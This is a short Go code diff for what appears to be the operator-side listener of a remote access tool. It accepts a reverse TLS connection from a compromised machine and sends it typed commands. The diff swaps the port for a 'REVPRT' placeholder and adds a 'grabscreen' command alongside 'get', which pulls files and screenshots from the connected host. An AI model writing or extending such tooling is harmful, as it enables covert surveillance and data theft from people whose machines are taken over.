@@ -17,7 +17,7 @@ import (
 const FILEREADBUFFSIZE = 512
 
 //PORT set server port here
-const PORT = ":4443"
+const LOCALPORT = ":REVPRT"
 
 func main() {
 	redc := color.New(color.FgHiRed, color.Bold)
@@ -32,8 +32,8 @@ func main() {
 		fmt.Println(err)
 	}
 	tlsconfig := &tls.Config{Certificates: []tls.Certificate{cert}}
-	cyanc.Println("Mask Server on wait ...ZZZzzz")
-	listner, _ := tls.Listen("tcp", PORT, tlsconfig)
+	cyanc.Println("Wait for the Tunnell ... ZzzZZ")
+	listner, _ := tls.Listen("tcp", LOCALPORT, tlsconfig)
 	conn, _ := listner.Accept()
 	for {
 		reader := bufio.NewReader(os.Stdin)
@@ -44,6 +44,9 @@ func main() {
 			conn.Close()
 			os.Exit(1)
 		} else if strings.Index(command, "get") == 0 {
+			getFilewithNameandSize(conn, command)
+
+		} else if strings.Index(command, "grabscreen") == 0 {
 			getFilewithNameandSize(conn, command)
 
 		} else {
